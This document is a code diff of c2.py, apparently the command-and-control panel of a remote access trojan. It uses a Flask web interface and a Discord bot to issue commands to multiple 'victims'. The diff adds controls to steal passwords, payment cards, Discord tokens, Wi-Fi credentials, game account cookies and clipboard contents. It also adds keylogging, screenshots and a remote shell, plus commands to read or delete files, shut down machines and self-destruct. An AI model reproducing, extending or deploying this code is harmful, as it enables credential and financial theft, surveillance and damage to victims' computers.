@@ -1,28 +1,23 @@
-# c2.py – Multi‑victim C2 panel (Flask + SocketIO)
-# Environment variables: BOT_TOKEN, CHANNEL_ID (set on Render)
-import os
-import time
-import json
-import threading
-import requests
+# c2.py – Ultimate C2 Panel (professional, per‑victim tabs, logs)
+# Deploy on Render with environment variables BOT_TOKEN, CHANNEL_ID
+
+import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Read tokens from environment (never hardcode!)
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHANNEL_ID = os.environ.get("CHANNEL_ID")
 if not BOT_TOKEN or not CHANNEL_ID:
-    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID environment variables")
+    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID")
 
 DATA_FILE = "victims_data.json"
 victims = {}
 log_queues = {}
 last_id = None
 
-# ---------- Persistent storage ----------
 def load_data():
     global victims, log_queues
     if os.path.exists(DATA_FILE):
@@ -32,8 +27,7 @@ def load_data():
                 victims = data.get('victims', {})
                 log_queues = data.get('log_queues', {})
                 for vid in victims:
-                    if 'last_seen' in victims[vid]:
-                        victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
+                    victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
         except:
             pass
 
@@ -45,7 +39,6 @@ def save_data():
     except:
         pass
 
-# ---------- Discord fetcher thread ----------
 def fetch_loop():
     global last_id, victims, log_queues
     while True:
@@ -70,18 +63,17 @@ def fetch_loop():
                         if victim_id not in log_queues:
                             log_queues[victim_id] = []
                         log_queues[victim_id].append(rest)
-                        if len(log_queues[victim_id]) > 100:
-                            log_queues[victim_id] = log_queues[victim_id][-100:]
+                        if len(log_queues[victim_id]) > 200:
+                            log_queues[victim_id] = log_queues[victim_id][-200:]
                         socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                 if msgs:
                     last_id = msgs[0]["id"]
-        except Exception as e:
-            print(f"Fetch error: {e}")
+        except:
+            pass
         time.sleep(2)
 
 threading.Thread(target=fetch_loop, daemon=True).start()
 
-# ---------- Web routes ----------
 @app.route('/')
 def index():
     return render_template_string(HTML)
@@ -119,7 +111,6 @@ def send_command():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ---------- HTML template (embedded) ----------
 HTML = """
 <!DOCTYPE html>
 <html>
@@ -130,22 +121,27 @@ HTML = """
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0a0f; font-family: 'Segoe UI', sans-serif; color: #eee; padding: 20px; }
-        .container { max-width: 1600px; margin: 0 auto; }
-        h1 { text-align: center; margin-bottom: 20px; color: #ff6b6b; }
-        .victims-bar { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
-        .victim-tab { background: #1e1e2a; border-radius: 40px; padding: 8px 20px; cursor: pointer; transition: 0.2s; border: 1px solid #3a3a4f; }
-        .victim-tab.active { background: #ff6b6b; border-color: #ff6b6b; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { text-align: center; margin-bottom: 20px; color: #ff6b6b; font-size: 2rem; letter-spacing: -0.5px; }
+        .victims-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; background: #15151f; padding: 12px; border-radius: 16px; }
+        .victim-tab { background: #1e1e2a; border-radius: 40px; padding: 8px 18px; cursor: pointer; transition: 0.2s; border: 1px solid #2a2a3c; font-size: 14px; display: flex; align-items: center; gap: 8px; }
+        .victim-tab.active { background: #ff6b6b; border-color: #ff6b6b; color: white; }
         .victim-tab.online { border-left: 4px solid #2ecc71; }
         .victim-tab.offline { opacity: 0.6; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+        .online .status-dot { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
+        .offline .status-dot { background: #e74c3c; }
         .main-panel { display: flex; gap: 20px; flex-wrap: wrap; }
-        .controls { flex: 1; min-width: 300px; background: #15151f; border-radius: 20px; padding: 20px; }
-        .log { flex: 2; min-width: 400px; background: #15151f; border-radius: 20px; padding: 20px; height: 70vh; overflow-y: auto; font-family: monospace; font-size: 13px; }
-        .button-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0; }
-        button { background: #2a2a3c; border: none; color: white; padding: 8px 14px; border-radius: 30px; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #ff6b6b; }
-        .cmd-row { display: flex; gap: 10px; margin-top: 15px; }
-        .cmd-row input { flex: 1; background: #1e1e2a; border: 1px solid #3a3a4f; border-radius: 30px; padding: 8px 15px; color: white; }
-        .log p { margin: 5px 0; border-left: 2px solid #ff6b6b; padding-left: 10px; }
+        .controls { flex: 1; min-width: 280px; background: #15151f; border-radius: 20px; padding: 20px; }
+        .log { flex: 2; min-width: 400px; background: #15151f; border-radius: 20px; padding: 20px; height: 65vh; overflow-y: auto; font-family: monospace; font-size: 13px; }
+        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
+        button { background: #2a2a3c; border: none; color: white; padding: 8px 16px; border-radius: 30px; cursor: pointer; transition: 0.2s; font-size: 13px; }
+        button:hover { background: #ff6b6b; transform: scale(1.02); }
+        .cmd-row { display: flex; gap: 10px; margin: 15px 0; }
+        .cmd-row input { flex: 1; background: #1e1e2a; border: 1px solid #3a3a4f; border-radius: 30px; padding: 8px 15px; color: white; outline: none; }
+        .log p { margin: 6px 0; border-left: 2px solid #ff6b6b; padding-left: 12px; word-break: break-word; }
+        .log pre { background: #0a0a12; padding: 8px; border-radius: 8px; overflow-x: auto; margin: 5px 0; }
+        footer { text-align: center; margin-top: 30px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
@@ -154,27 +150,41 @@ HTML = """
     <div class="victims-bar" id="victimsBar"></div>
     <div class="main-panel">
         <div class="controls">
-            <div id="currentVictim">No victim selected</div>
+            <div id="currentVictim" style="margin-bottom: 10px; font-weight: bold;">No victim selected</div>
             <div class="button-group">
                 <button onclick="sendCmd('!info')">💻 Info</button>
                 <button onclick="sendCmd('!ip')">🌐 IP</button>
+                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
+                <button onclick="sendCmd('!active')">🪟 Active</button>
+                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
+                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
                 <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
                 <button onclick="sendCmd('!cards')">💳 Cards</button>
-                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
                 <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
                 <button onclick="sendCmd('!steam')">🎮 Steam</button>
                 <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
-                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
                 <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
                 <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
                 <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
+                <button onclick="sendCmd('!processes')">📊 Processes</button>
+                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
+                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
+                <button onclick="sendCmd('!lock')">🔒 Lock</button>
+                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
+                <button onclick="sendCmd('!restart')">⟳ Restart</button>
+                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
                 <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
-                <button onclick="sendCmd('!exit')" style="background:#8b0000;">💀 Exit</button>
+                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button>
+                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
             </div>
-            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir"><button onclick="sendCustom()">▶️ Run</button></div>
+            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
+            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
+            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
+            <div class="cmd-row"><input id="lsPath" placeholder="!ls path (default C:\\)"><button onclick="sendCmd('!ls '+lsPath.value)">List</button></div>
         </div>
         <div class="log" id="logPanel"></div>
     </div>
+    <footer>Commands sent via Discord bot. All results appear here.</footer>
 </div>
 <script>
     const socket = io();
@@ -195,23 +205,23 @@ HTML = """
                 victims[v.id] = v;
                 const tab = document.createElement('div');
                 tab.className = `victim-tab ${v.online ? 'online' : 'offline'} ${currentVictim === v.id ? 'active' : ''}`;
-                tab.innerHTML = `${v.id}`;
+                tab.innerHTML = `<span class="status-dot"></span> ${v.id}`;
                 tab.onclick = () => selectVictim(v.id);
                 bar.appendChild(tab);
             });
             if (currentVictim && victims[currentVictim]) {
-                document.getElementById('currentVictim').innerHTML = `Controlling: ${currentVictim}`;
+                document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${currentVictim}`;
             } else if (data.length > 0 && !currentVictim) {
                 selectVictim(data[0].id);
             } else if (!currentVictim) {
-                document.getElementById('currentVictim').innerHTML = 'No victims online';
+                document.getElementById('currentVictim').innerHTML = '⚠️ No victims online';
             }
         });
     }
 
     function selectVictim(victimId) {
         currentVictim = victimId;
-        document.getElementById('currentVictim').innerHTML = `Controlling: ${victimId}`;
+        document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${victimId}`;
         fetch(`/api/logs/${victimId}`).then(r=>r.json()).then(logs => {
             const panel = document.getElementById('logPanel');
             panel.innerHTML = '';
@@ -229,7 +239,7 @@ HTML = """
     }
 
     function sendCmd(cmd) {
-        if (!currentVictim) { alert('Select a victim'); return; }
+        if (!currentVictim) { alert('Select a victim first'); return; }
         fetch('/send', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -255,5 +265,4 @@ HTML = """
 
 if __name__ == '__main__':
     load_data()
-    print("[*] C2 Panel running at http://localhost:5000")
     socketio.run(app, host='0.0.0.0', port=5000, debug=False)
